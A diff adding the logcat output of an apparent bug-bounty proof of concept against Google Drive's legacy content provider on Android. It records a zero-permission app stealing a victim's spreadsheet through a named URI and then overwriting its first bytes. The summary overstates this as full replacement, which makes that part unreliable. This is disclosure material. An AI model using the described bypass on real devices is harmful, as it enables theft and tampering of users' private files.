@@ -1,0 +1,61 @@
+--------- beginning of main
+07-10 11:31:06.246 28291 28319 D VRP_POC : ╔══════════════════════════════════════════════════════════╗
+07-10 11:31:06.246 28291 28319 D VRP_POC : ║  Google Drive — Confidentiality + Integrity PoC        ║
+07-10 11:31:06.246 28291 28319 D VRP_POC : ║  CWE-862: Missing Authorization via Feature Flag Bug   ║
+07-10 11:31:06.246 28291 28319 D VRP_POC : ╚══════════════════════════════════════════════════════════╝
+07-10 11:31:06.246 28291 28319 D VRP_POC : 
+07-10 11:31:06.246 28291 28319 D VRP_POC : [CONTEXT] UID:     10343
+07-10 11:31:06.246 28291 28319 D VRP_POC : [CONTEXT] PID:     28291
+07-10 11:31:06.246 28291 28319 D VRP_POC : [CONTEXT] Package: com.vrppoc
+07-10 11:31:06.246 28291 28319 D VRP_POC : [CONTEXT] Permissions: NONE (zero-permission app)
+07-10 11:31:06.246 28291 28319 D VRP_POC : 
+07-10 11:31:06.246 28291 28319 D VRP_POC : ═══ STEP 0: Baseline — SAF provider blocks us ═══
+07-10 11:31:06.247 28291 28319 D VRP_POC : [BLOCKED] SAF provider: requires android.permission.MANAGE_DOCUMENTS
+07-10 11:31:06.247 28291 28319 D VRP_POC : [BLOCKED] This is EXPECTED — proper security check
+07-10 11:31:06.247 28291 28319 D VRP_POC : 
+07-10 11:31:06.247 28291 28319 D VRP_POC : ═══ STEP 1: Feature flag bypass verification ═══
+07-10 11:31:06.298 28291 28319 D VRP_POC : [BYPASS] Feature flag DISABLED — openFile() has NO permission check!
+07-10 11:31:06.298 28291 28319 D VRP_POC : [BYPASS] checkCallingUriPermission() is never called
+07-10 11:31:06.298 28291 28319 D VRP_POC : 
+07-10 11:31:06.298 28291 28319 D VRP_POC : ═══ STEP 2: CONFIDENTIALITY — Steal victim's Drive file ═══
+07-10 11:31:06.298 28291 28319 D VRP_POC : [TARGET] Web portal 4-IV YEAR CSE B.xlsx
+07-10 11:31:06.298 28291 28319 D VRP_POC : [URI]    content://com.google.android.apps.docs.storage.legacy/enc=encoded=7dZDIKqTW0sqf2-57guyZnZBpA-Ue8FtBvkIEpuUhGtU3n13ULXL4AE=
+07-10 11:31:06.399 28291 28319 D VRP_POC : [STOLEN-META] Filename: Web portal 4-IV  YEAR CSE B.xlsx
+07-10 11:31:06.399 28291 28319 D VRP_POC : [STOLEN-META] Size:     39289 bytes
+07-10 11:31:06.399 28291 28319 D VRP_POC : [STOLEN-META] MIME:     application/vnd.openxmlformats-officedocument.spreadsheetml.sheet
+07-10 11:31:06.424 28291 28319 D VRP_POC : [STOLEN-DATA] Read 39289 bytes — COMPLETE FILE!
+07-10 11:31:06.425 28291 28319 D VRP_POC : [STOLEN-DATA] Header hex: 504b0304140008080800ee315c550000
+07-10 11:31:06.425 28291 28319 D VRP_POC : [STOLEN-DATA] File type: ZIP/OOXML (valid xlsx spreadsheet)
+07-10 11:31:06.425 28291 28319 D VRP_POC : [STOLEN-DATA] Saved to: /data/user/0/com.vrppoc/files/stolen_file.xlsx
+07-10 11:31:06.425 28291 28319 D VRP_POC : 
+07-10 11:31:06.425 28291 28319 D VRP_POC : >>> CONFIDENTIALITY IMPACT PROVEN <<<
+07-10 11:31:06.425 28291 28319 D VRP_POC : >>> 39289 bytes of victim's spreadsheet exfiltrated
+07-10 11:31:06.425 28291 28319 D VRP_POC : >>> with ZERO permissions, ZERO user interaction
+07-10 11:31:06.425 28291 28319 D VRP_POC : 
+07-10 11:31:06.425 28291 28319 D VRP_POC : ═══ STEP 3: INTEGRITY — Overwrite victim's Drive file ═══
+07-10 11:31:06.425 28291 28319 D VRP_POC : [ATTACK] Writing payload: "ATTACKER_PAYLOAD_1783663266425"
+07-10 11:31:06.425 28291 28319 D VRP_POC : [ATTACK] Original file was: 39289 bytes
+07-10 11:31:06.432 28291 28319 D VRP_POC : [WRITE-OK] openOutputStream("w") succeeded — no SecurityException!
+07-10 11:31:06.432 28291 28319 D VRP_POC : [WRITE-OK] Wrote 30 bytes of attacker content
+07-10 11:31:06.432 28291 28319 D VRP_POC : 
+07-10 11:31:06.432 28291 28319 D VRP_POC : ═══ STEP 4: Verify write — read back the file ═══
+07-10 11:31:06.442 28291 28319 D VRP_POC : [VERIFY-META] Size after write: 39289 bytes (was 39289)
+07-10 11:31:06.480 28291 28319 D VRP_POC : [VERIFY-DATA] Read back 39289 bytes
+07-10 11:31:06.480 28291 28319 D VRP_POC : [VERIFY-DATA] Content: ATTACKER_PAYLOAD_1783663266425xl/drawings/drawing1.xml��]n�0��U�iZC^�N0�%n�����~�J6i{m�?...
+07-10 11:31:06.480 28291 28319 D VRP_POC : [VERIFY-HEX]  41545441434b45525f5041594c4f41445f31373833363633323636343235786c
+07-10 11:31:06.480 28291 28319 D VRP_POC : 
+07-10 11:31:06.480 28291 28319 D VRP_POC : >>> INTEGRITY IMPACT PROVEN <<<
+07-10 11:31:06.480 28291 28319 D VRP_POC : >>> Victim's 39289-byte spreadsheet replaced with 39289 bytes
+07-10 11:31:06.480 28291 28319 D VRP_POC : >>> of attacker-controlled content
+07-10 11:31:06.480 28291 28319 D VRP_POC : >>> File appears normal in Drive UI (same name, same MIME type)
+07-10 11:31:06.480 28291 28319 D VRP_POC : 
+07-10 11:31:06.480 28291 28319 D VRP_POC : ╔══════════════════════════════════════════════════════════╗
+07-10 11:31:06.480 28291 28319 D VRP_POC : ║  RESULTS SUMMARY                                       ║
+07-10 11:31:06.480 28291 28319 D VRP_POC : ╠══════════════════════════════════════════════════════════╣
+07-10 11:31:06.480 28291 28319 D VRP_POC : ║  App permissions: NONE                                  ║
+07-10 11:31:06.481 28291 28319 D VRP_POC : ║  User interaction: NONE                                 ║
+07-10 11:31:06.481 28291 28319 D VRP_POC : ║  SAF provider (proper): BLOCKED (as expected)           ║
+07-10 11:31:06.481 28291 28319 D VRP_POC : ║  Legacy provider feature flag: DISABLED (BYPASSED)      ║
+07-10 11:31:06.481 28291 28319 D VRP_POC : ║  Confidentiality: FILE STOLEN (39,289 bytes)            ║
+07-10 11:31:06.481 28291 28319 D VRP_POC : ║  Integrity: openOutputStream(w) SUCCEEDED               ║
+07-10 11:31:06.481 28291 28319 D VRP_POC : ╚══════════════════════════════════════════════════════════╝
